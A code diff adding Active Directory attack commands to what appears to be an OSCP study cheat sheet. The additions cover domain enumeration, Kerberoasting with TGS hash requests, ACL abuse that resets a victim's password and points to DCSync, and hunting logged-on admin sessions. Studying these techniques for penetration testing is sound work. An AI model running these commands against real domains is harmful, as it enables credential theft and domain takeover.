@@ -18,6 +18,13 @@ const adEnum: OscpContent = {
 net user /domain; net group "Domain Admins" /domain
 nltest /dclist:<domain>`,
                 },
+                {
+                    label: 'whoami + DC locator',
+                    code: `whoami /all
+echo %USERDOMAIN% %LOGONSERVER%
+nltest /dsgetdc:<domain>
+ipconfig /all`,
+                },
             ],
             tags: ['ad', 'domain', 'foothold', 'context'],
         },
@@ -36,6 +43,11 @@ nltest /dclist:<domain>`,
 netexec smb <dc> -u '' -p '' --rid-brute
 ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description
 kerbrute userenum -d <domain> --dc <dc> users.txt`,
+                },
+                {
+                    label: 'Shares + users via null',
+                    code: `netexec smb <dc> -u '' -p '' --users --groups --shares
+enum4linux-ng -A <dc>`,
                 },
             ],
             tags: ['null-session', 'rid-brute', 'kerbrute', 'ldap', 'enum4linux'],
@@ -56,6 +68,12 @@ Get-DomainUser -PreauthNotRequired                    # AS-REP roastable
 Find-LocalAdminAccess
 Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'}`,
                 },
+                {
+                    label: 'Users / computers / shares',
+                    code: `Get-DomainUser | select samaccountname,description,pwdlastset
+Get-DomainComputer | select dnshostname,operatingsystem
+Find-DomainShare`,
+                },
             ],
             tags: ['powerview', 'spn', 'acl', 'find-localadminaccess'],
         },
@@ -72,6 +90,12 @@ Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights
                     label: 'Collect (from Kali with creds)',
                     code: 'bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c all',
                 },
+                {
+                    label: 'SharpHound from a domain host',
+                    code: `Import-Module .\\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix audit
+# Kali: neo4j start && bloodhound  (zip the json)`,
+                },
             ],
             references: [
                 { label: 'BloodHound docs', url: 'https://bloodhound.readthedocs.io/' },
@@ -86,6 +110,19 @@ Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights
             os: 'ad',
             description:
                 'Accounts with a servicePrincipalName can be Kerberoasted - any domain user can request their TGS and crack it offline.',
+            commands: [
+                {
+                    label: 'List SPNs',
+                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>
+setspn -T <domain> -Q */*
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname`,
+                },
+                {
+                    label: 'Request TGS hashes',
+                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request
+netexec ldap <dc> -u <user> -p <pass> --kerberoast kerberoast.txt`,
+                },
+            ],
             tags: ['spn', 'kerberoast', 'service-account'],
         },
         {
@@ -96,6 +133,20 @@ Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights
             os: 'ad',
             description:
                 'GenericAll/GenericWrite/WriteDacl over a user or group, or DS-Replication rights, are direct escalation. GenericAll on a user -> reset their password; DCSync rights -> dump every hash.',
+            commands: [
+                {
+                    label: 'Find dangerous ACEs',
+                    code: `Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword'}
+# BloodHound: shortest path to DA, then inspect inbound ACLs`,
+                },
+                {
+                    label: 'Abuse GenericAll / WriteDacl',
+                    code: `# GenericAll on a user -> reset their password
+net user <victim> <NewPass1!> /domain
+# bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <victim> <NewPass1!>
+# WriteDacl -> grant yourself DCSync, then secretsdump`,
+                },
+            ],
             tags: ['acl', 'genericall', 'writedacl', 'dcsync-rights'],
         },
         {
@@ -106,6 +157,20 @@ Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights
             os: 'ad',
             description:
                 'A Domain Admin (or other high-value user) is logged on to a machine you can reach. Compromise that machine, then steal their token or credentials.',
+            commands: [
+                {
+                    label: 'Who is logged on',
+                    code: `netexec smb <target> -u <user> -p <pass> --sessions
+qwinsta /server:<target>
+Get-NetSession -ComputerName <host>`,
+                },
+                {
+                    label: 'Logged-on users across the subnet',
+                    code: `netexec smb <target> -u <user> -p <pass> --loggedon-users
+netexec smb <subnet>/24 -u <user> -p <pass> --sessions
+query user /server:<target>`,
+                },
+            ],
             tags: ['sessions', 'hassession', 'token', 'logged-on'],
         },
     ],
